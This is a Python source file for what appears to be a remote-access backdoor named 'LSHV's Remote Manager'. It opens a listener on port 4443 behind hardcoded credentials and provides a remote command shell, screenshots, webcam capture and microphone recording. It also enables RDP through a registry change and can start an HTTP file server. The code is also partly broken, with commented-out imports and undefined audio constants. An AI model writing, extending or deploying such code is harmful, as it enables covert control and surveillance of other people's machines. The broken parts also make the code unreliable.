import subprocess, os, socket, sys, wave, threading, json#, pyaudio, cv2
from PIL import ImageGrab
IMAGE = ImageGrab.grab()
#cap = cv2.VideoCapture(0)
#-------------------------------------------------------#
skt = socket.socket()
skt.bind(('0.0.0.0', 4443))
skt.listen(64)
wave_out_file = "./src.wav"
wave_rec_time = 10
#-------------------------------------------------------#
info = """
--------------------------------
|   LSHV's Remote Manager
--------------------------------
|   Commands  |   Info         
|-------------------------------
|   shell     |   Open Shell.
|   desktop   |   Show desktop.
|   capstone  |   Show capstone.
|   voices    |   Get Voices.
|   service   |   Open service.
|   help      |   Show this Info.
--------------------------------
"""
service_list = """
--------------------------------
|   LSHV's Remote Manager
--------------------------------
|   Services  |   Info         
|-------------------------------
|   rdp       |   Open rdp.
|   http      |   Start httpd.
--------------------------------
"""
#-------------------------------------------------------#
def Exec(Command):
    global res, data
    data = subprocess.Popen(Command,shell=True,
                                stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE)
    stdout = data.stdout.read()
    stderr = data.stderr.read()
    echo = stdout + stderr
    return echo

def audio_record():
    out_file = wave_out_file
    rec_time = wave_rec_time
    CHUNK = 1024
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=16000,
                    input=True,
                    frames_per_buffer=CHUNK)
    print("Start Recording...")
    frames = []
    for i in range(0, int(RATE / CHUNK * rec_time)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    print("Recording Done...")
    wf = wave.open(out_file, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
t0 = threading.Thread(target=audio_record)

def httpd():
    try:
        os.system("python -m http.server 8080")
    except:
        null = ""
httpd = threading.Thread(target=httpd)
#-------------------------------------------------------#
def main():
    global Client, Username, Password, Recv, Command
    while True:
        Client, Addr = skt.accept()
        Client.send(" [*] Your Token Is Guest~".encode())
        Username = Client.recv(16).decode()
        Client.send(" [*] Your Privilege Level Is 15~".encode())
        Password = Client.recv(16).decode()
        if Username[0:4] == "zero":
            if Password[0:7] == "eternal":
                Client.send(info.encode())
                while True:
                    try:
                        Client.send(" ~[>]".encode())
                        Recv = Client.recv(1024).decode()
                    except:
                        Exit_Error = ""
                    try:
                        if Recv[0:4] == "exit":
                            break
                            Client.close()
                        elif Recv[0:4] == "help":
                            Client.send(info.encode())
                        elif Recv[0:5] == "shell":
                            while True:
                                try:
                                    Client.send(" ~[#]".encode())
                                    Command = Client.recv(1024).decode()
                                except:
                                    Exit_Error = ""
                                if Command[0:4] == "exit":
                                    break
                                else:
                                    Client.send(Exec(Command))
                        elif Recv[0:7] == "desktop":
                            IMAGE.save('./desktop.jpeg','jpeg')
                            Client.send(" [+] Desktop Screen Successful.".encode())

                        elif Recv[0:8] == "capstone":
                            while(cap.isOpened()):
                                ret,img = cap.read()
                                if ret == True:
                                    cv2.imshow('Image',img)
                                    k = cv2.waitKey(100)
                                    if k == ord('a') or k == ord('A'):
                                        cv2.imwrite('test.jpg',img)
                                        break
                            cap.release()
                            Client.send(info.encode())

                        elif Recv[0:5] == "voices":
                            t0.start()
                            Client.send(" [+] Voice Successful.".encode())

                        elif Recv[0:7] == "service":
                            Client.send(service_list.encode())
                            Recv = Client.recv(1024).decode()
                            if Recv[0:3] == "rdp":
                                os.system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f")
                            elif Recv[0:4] == "http":
                                httpd.start()
                    except:
                        Exit_Error = ""
            else:
                Client.send(" [*] You Not Have A Egg~".encode())
        else:
            Client.send(" [*] You Not Have A Egg~".encode())
main()